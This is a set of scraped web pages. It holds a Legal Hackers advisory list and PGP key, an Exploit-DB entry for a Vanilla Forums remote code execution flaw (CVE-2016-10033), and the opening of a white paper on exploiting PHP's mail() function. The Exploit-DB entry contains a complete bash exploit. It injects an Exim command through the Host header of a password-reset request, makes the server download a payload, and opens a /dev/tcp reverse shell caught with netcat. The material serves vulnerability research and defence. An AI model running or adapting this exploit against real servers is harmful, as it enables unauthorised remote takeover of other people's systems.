28. [Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/zend-framework-XXE-vuln.html)
29. [Nagios - Nagios Plugins - check\_dhcp = 2.0.2 Race Condition](./advisories/nagios-check_dhcp-race.html)
30. [Nagios - Nagios Plugins - check\_dhcp <= 2.0.1 Arbitrary Option File Read](./advisories/nagios-check_dhcp.html)
31. [Nagios - NRPE - Nagios Remote Plugin Executor <= 2.15 Remote Command Execution](./advisories/nagios-nrpe.html)
32. [Zabbix <= 1.8.1 SQL Injection](./advisories/zabbix181api-sql.html)
33. [Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection](./advisories/invision_power_board_multiple_vulns.html)
34. [WordPress <= 2.8.5 Unrestricted File Upload Arbitrary PHP Code Execution](./advisories/wordpress_unrestricted_file_upload_vuln.html)

# PGP key

```
-----BEGIN [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----

mQENBFXIwTYBCACx+HDekh0eiPpqXZOfbrQKKrbc5VZw6dB1HSIHPXZ9ifGMhGow
T6f8+gYU4SSlN/T9KiamAzlA9Nz7QdgEcXPq8tMexKQnoCyDM0wSHqOB1en7RRTN
JdchOynTYzFWt+IBoQRGspQE1SXP2RLUwioedtDz+C21iyNMwR6OcCoCFfGV2eeZ
aFM7oCKwSz9oxCJ+D3SUv5U9AZjKFoV0B52dJVVzeaqtnO3lJi7dK8+NTNY5ML+N
3cacO9qnngoNJ/iy/AtjTdmX+XHgCuSnEbY2kh3A1uAyr5ygh1YQ7K4kG7I7AXo9
lgrzQY7/xg8+uSY0NS4kJG/OEDBxX+yhNNBhABEBAAG0J0Rhd2lkIEdvbHVuc2tp
IDxkYXdpZEBsZWdhbGhhY2tlcnMuY29tPokBOAQTAQIAIgUCVcjBNgIbAwYLCQgH
AwIGFQgCCQoLBBYCAwECHgECF4AACgkQU/e+VX9sCuRSmAf+MXvieaQiPYNgjey0
lVmvEw/+6EJ4DFZ203mLdrDwKLPSe0GrzbYyma2AA8XcWDimuhvsJLJ4Rt8j7F9W
G8kyaCh0ms/NTlSI3aI5ctcaX79WtmOLwfTo+rtl0czj/3ZMXHHnH1ky0M390VQ8
ixsk5Y53wAeTSrvN8Rwyg0x1ZHanwBmgDtFPa1ubYmFDHx/Ke1H57EvVMlyi4Yz5
vs58rqr3UNKxwoANQ0X38BGHZ7K1zObZGOwJGkuGt+K3LvBOLn7fbS1P4i6u5oIw
vJRDyq6ZWrLivkc3pypUV09jjQ9vQIRSXwhfCPwRb/U45SgnO5zTq8Ospb9qsG2E
remeaLkBDQRVyME2AQgArg35L60GCpwFjMGZ4KhHedD+ioaW08E4S9pCuxsE2kzC
D/0RfzAlKeCgvrULGCTXU4kcy3ODAeNlByEtF1SE7FlSteS1X12S4Kyn8RXhYhjI
XNwYzTGTStwprYMaRSEcIqCIAHa/dcOZzsiibf+G1phwKs7FU31TSgZrbpEjNdYO
AzFpeV7BqHoo2lMQJCDEN2EIb5KEQvNxyzFjyjHcnuJ/4GQRYF0xBcVqjoiqoedF
8Uib8WM9yFF+W21auZ+yURPp6HdqT6Cv6Qx2djpC3uKfms6VOJKBDVSiQhx/GcKh
dPAobFVDfOdeWj88v3RZyR9wwRAlur5qRVIzD75iTQARAQABiQEfBBgBAgAJBQJV
yME2AhsMAAoJEFP3vlV/bArktOoH/2ID21GHxsDX/x6cutapMuveK/4pmZ/U2jWr
r+urzFYKV+muezkJCm2qy02pcJYud1DxRY5aCe2J5m1WYGROnCm5CyBb8NiQLBeK
uzk4cK1fYqk35475dE+vHdnFdz1Td2laSafYze+M2KPX82YN4R/dGsOn8hR+39b4
WXS7zzoHh+KSwvs2ab6E8Nd3p4s0jvOvQo/+L52q1+iWSnzahXRTc3u1RHIzTf+f
X6NszAhli121jVQxLeaSuxkXyuKZM5IcFfojY55GSjLUblA1A+I2qmkcheA6rs4E
hZ+4m5DgtVG5+fJpoDLLxtKYp4hSxhd59Z9mlTWMqptK0WGkW48=
=vtjs
-----END [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----
```

# ExploitBox

1. [![](exploitbox_logo.png)
   **ExploitBox.io** - A Playground & Labs For Bug Hunters, Researchers, Penetration Testers &
   others interested in hacking, security, exploits and the art of exploitation.](https://ExploitBox.io)

# PoC Videos

1. [SquirrelMail < 1.4.23 Remote Code Execution (CVE-2017-7692)](https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
2. [PHPMailer / SwiftMailer / Zend-mail - Remote Code Execution
   (CVE-2016-10033 / CVE-2016-10045 / CVE-2016-10074 / CVE-2016-10034)](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)
3. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
4. [Nagios Core < 4.2.2 Curl Command Injection / Remote Code Execution (CVE-2016-9565)](https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
5. [MySQL / MariaDB / Percona - Race Cond. & Root Privilege Esc. (CVE-2016-6663 & CVE-2016-6664)](https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html)
6. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
7. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](http://legalhackers.com/videos/Apache-Tomcat-DebPkg-Root-PrivEsc-Exploit.html)
8. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection Exploit (CVE-2016-4264)](http://legalhackers.com/videos/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)

# Security Papers

1. [Pwning PHP mail() function For Fun And Remote Code Execution - New Exploitation Techniques And Vectors](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html)

[Follow @dawid\_golunski](https://twitter.com/%40dawid_golunski)

Legal Hackers © 2024



=== Content from www.exploit-db.com_a94b42e9_20250125_194705.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Vanilla Forums < 2.3 - Remote Code Execution

#### EDB-ID:

###### 41996

#### CVE:

###### [2016-10073](https://nvd.nist.gov/vuln/detail/CVE-2016-10073) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-05-11

---

**Vulnerable App:**

```
#!/bin/bash
#
#      __                     __   __  __           __
#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
#            /____/
#
#
# Vanilla Forums <= 2.3   Remote Code Execution (RCE) PoC Exploit 0day
# Core version (no plugins, default config.)
#
# CVE-2016-10033 (RCE)
# CVE-2016-10073 (Header Injection)
#
# vanilla-forums-rce-exploit.sh (ver. 1.0)
#
#
# Discovered and coded by
#
# Dawid Golunski
# https://legalhackers.com
# https://twitter.com/dawid_golunski
#
# ExploitBox project:
# https://ExploitBox.io
#
#
# Exploit code:
# https://exploitbox.io/exploit/vanilla-forums-rce-exploit.sh
#
# Full advisory URL:
# https://exploitbox.io/vuln/Vanilla-Forums-Exploit-RCE-0day-Remote-Code-Exec-CVE-2016-10033.html
#
# Related advisories:
# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
# https://exploitbox.io/vuln/Vanilla-Forums-Exploit-Host-Header-Injection-CVE-2016-10073-0day.html
#
# White-paper 'Pwning PHP mail() function For Fun And RCE'
# https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html
#
#
# Usage:
# ./vanilla-forums-rce-exploit.sh target-forum-url reverse_shell_ip
#
# Tested on:
# Vanilla Core 2.3
# https://open.vanillaforums.com/addon/vanilla-core-2.3
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulnerabilities/exploitation?
#
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# Subscribe at:
#
# https://ExploitBox.io
#
# https://twitter.com/Exploit_Box
#
# -----------------------------------------------------------------

intro="
DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r
bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f
G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c
G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg
IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f
IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f
X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6
b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb
NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N
TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1
QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz
NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g
G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54
eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb
WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO
TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg
ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb
MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD
G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob
WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz
NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb
MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f
X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4
bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K"

function prep_host_header() {
        cmd="$1"
        rce_cmd="\${run{$cmd}}";

        # replace / with ${substr{0}{1}{$spool_directory}}
        #sed 's^/^${substr{0}{1}{$spool_directory}}^g'
        rce_cmd="`echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"

        # replace ' ' (space) with
        #sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
        rce_cmd="`echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"
        #return "target(any -froot@localhost -be $rce_cmd null)"
        host_header="target(any -froot@localhost -be $rce_cmd null)"
        return 0
}

echo "$intro"  | base64 -d

if [ "$#" -ne 2 ]; then
	echo -e "Usage:\n$0 target-forum-url reverse_shell_ip\n"
	exit 1
fi
target="$1"
rev_host="$2"

echo -e '                   \e[44m| ExploitBox.io |\e[0m'
echo -e "
\e[94m+ --=|\e[0m \e[91m  Vanilla Forums <= 2.3 Unauth. RCE Exploit \e[0m  \e[94m|\e[0m"
#sleep 1s
echo -e "\e[94m+ --=|\e[0m                                               \e[94m|\e[0m
\e[94m+ --=|\e[0m           Discovered & Coded By               \e[94m|\e[0m
\e[94m+ --=|\e[0m               \033[94mDawid Golunski\033[0m                  \e[94m|\e[0m
\e[94m+ --=|\e[0m         \033[94mhttps://legalhackers.com\033[0m              \e[94m|\e[0m
\e[94m+ --=|\e[0m               \033[94m@dawid_golunski\033[0m                 \e[94m|\e[0m
\e[94m+ --=|\e[0m                                               \e[94m|\e[0m
\e[94m+ --=|\e[0m \"With Great Power Comes Great Responsibility\" \e[94m|\e[0m
\e[94m+ --=|\e[0m        \e[91m*\e[0m For testing purposes only \e[91m*\e[0m          \e[94m|\e[0m

"

echo -ne "\e[91m[*]\033[0m"
read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
echo
if [ "$choice" == "y" ]; then

	echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
	#sleep 2s
	#sleep 2s

	# Host payload on :80
	RCE_exec_cmd="(sleep 5s && nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1) &"
	echo "$RCE_exec_cmd" > rce.txt
	python -mSimpleHTTPServer 80 2>/dev/null >&2 &
	hpid=$!

	# POST data string
	data='hpt=&Target=discussions&Email=admin&Request+a+new+password=Request+a+new+password&DeliveryType=VIEW&DeliveryMethod=JSON'

	# Save payload on the target in /tmp/rce
	cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
	prep_host_header "$cmd"
	curl -H"Host: $host_header" -0 -s -i -d "$data" $target/entry/passwordrequest | grep -q "200 OK"
	if [ $? -ne 0 ]; then
		echo "[!] Failed conecting to the target URL. Exiting"
		exit 2
	fi
	echo -e "\e[92m[+]\033[0m Connected to the target"
	echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
	sleep 2s

	# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
	cmd="/usr/bin/nohup /bin/bash /tmp/rce"
	prep_host_header "$cmd"
	#echo -e "Host Payload2: \nHost: $host_header"
	curl -H"Host: $host_header" -s -0 -i -d "$data" $target/entry/passwordrequest >/dev/null 2>&1 &
	echo -e "\n\e[92m[+]\033[0m Payload executed!"

	echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
	nc -vv -l 1337
	#killall python
	echo
else
	echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
	exit 0

fi
	#kill -9 $hpid

echo "Exiting..."
exit 0

```

**Tags:**

**Advisory/Source:**
[Link](https://exploitbox.io/vuln/Vanilla-Forums-Exploit-RCE-0day-Remote-Code-Exec-CVE-2016-10033.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from exploitbox.io_cfb2ed37_20250126_112800.html ===


[Brand
![](../assets/img/logo.png)](../index.html)

* Stay Tuned

```

|=-----------------------------------------------------------------------=|
|=-------------=[ Pwning PHP mail() function For Fun And RCE  ]=---------=|
|=---------------=[ New Exploitation Techniques And Vectors ]=-----------=|
|=----------------------------=[ Release 1.0 ]=--------------------------=|
|=-----------------------------------------------------------------------=|
|=-----------------------------------------------------------------------=|
|=-------------------=[ by [https://legalhackers.com/](https://twitter.com/dawid_golunski%3EDawid%20Golunski%3C/a%3E%20of%20Legal%20Hackers%20%5D%3D-------------%3D%7C%7C%3D---------------------%3D%5B%20dawid%5Bat%5Dlegalhackers.com%20%5D%3D-------------------%3D%7C%7C%3D---------------------%3D%5B%20%3Ca%20href%3D) ]=-------------------=|
|=-----------------------------------------------------------------------=|
|=---------------------=[ <https://ExploitBox.io>     ]=-------------------=|
|=---------------------=[ [@Exploit_Box](https://twitter.com/Exploit_Box)              ]=-------------------=|
|=-----------------------------------------------------------------------=|

--[ Table of contents

0 - Introduction
1 - SMTP protocol - RFC 2821
2 - The mail() function
    2.1 - The 5th parameter ($additional_parameters)
    2.2 - The /usr/sbin/sendmail interface invoked by the mail() function
3 - Sendmail Command Injection via mail() and $additional_parameters
    3.1 - escapeshellcmd() escaping
    3.2 - Sendmail Command Parameter Injection
4 - Differences in the implementation of /usr/sbin/sendmail
5 - Known exploitation vectors
    5.1 - Sendmail MTA: Arbitrary File Read with -C argument
    5.2 - Sendmail MTA: Arbitrary File Write / Remote Code Execution
6 - New exploitation vectors/techniques discovered by the author
    6.1 - All MTAs: Snatching emails / Performing Recon
    6.2 - Sendmail MTA: Improvements to the existing File Write vector
    6.3 - SendmailMTA: Remote Code Execution via sendmail.cf config
    6.4 - Exim MTA: Remote Code Execution
    6.5 - Postfix MTA: Code Execution via malicious config
    6.6 - Sendmail MTA: Denial of Service via File Read + File Append
7 - The param injection point & Real World vulnerability examples
    7.1 - Vulnerable email libraries (PHPMailer / Zend-mail / SwiftMailer)
    7.2 - The sender injection via SetFrom() method of the PHP email libs
    7.3 - Other injection points / ways to exploit mail() vulnerabilities
8 - Bypass techniques
    8.1 - The beauty of RFC 3696 & RFC 822
    8.2 - Bypassing escapeshellarg() applied on mail()
9 - Credits
10 - References
11 - Disclaimer

--[ 0 - Introduction

This white-paper strives to clear the common misonception in regards to
the limitations in exploitation of the PHP mail() function and show that
the exploitation can be taken further than what is currently believed.

It presents several new exploitation vectors and bypass techniques
on the PHP mail() function that were discovered and recently released by the
author of this white-paper in the course of finding multiple critical
vulnerabilities in major PHP e-mail sending libraries (PHPMailer, Zend
Framework / Zend-mail, SwiftMailer) that are used by millions of web
applications/projects (e.g Wordpress, Drupal, Joomla etc.)  and PHP
programming frameworks (Zend, Yii2, Symphony, Laravel etc.)

The techniques include Exim vector that was believed to not be exploitable
via mail() function. This vector takes the mail() injection attacks to
a new level.

A successful exploitation of the mail() function, could allow attackers to
achieve Remote Code Execution and other malicious goals.

--[ 1 - SMTP protocol - RFC 2821

According to the RFC 2821
<https://www.ietf.org/rfc/rfc2821.txt>

A client email program would typically send a set of SMTP commands similar
to the following when connecting to an SMTP server:

HELO server-port25.com
MAIL FROM: <support@server-port25.com>
RCPT TO: <jdoe@dest-server.com>

DATA
From: "John Smith" <jsmith@server-port25.com>
Reply-To: "Another Johns email" <John2@another-server25.com>
To:   "Jane Doe" <jdoe@dest-server.com>
Subject: test message
Date: Wed, 4 Jan 2017 06:19:57 -0400

Hello World,

This is a test message sent by SMTP

Regards

.

The important part from the perspective of understanding PHP mail()
function / sendmail's email address usage described further on is that SMTP
client specifies email addresses related to the sender addresses in 2
places:

MAIL FROM: <support@server-port25.com>

and in the header set:

From: "John Smith" <jsmith@server-port25.com>
Reply-To: "Another Johns email" <John2@another-server25.com>

that is sent after the DATA command.

The first will be used by the destination SMTP server to return an email
in case of a delivery problem.

The latter will be used entirely by the email client software (such as
Outlook, Thunderbird etc.) of the user who receives the email, to display
the sender information (based on the From header) in a 'From' address
field as well as to decide (based on Reply-To header if present, or From
header if missing) which address to reply to when the user clicks the
Reply button.

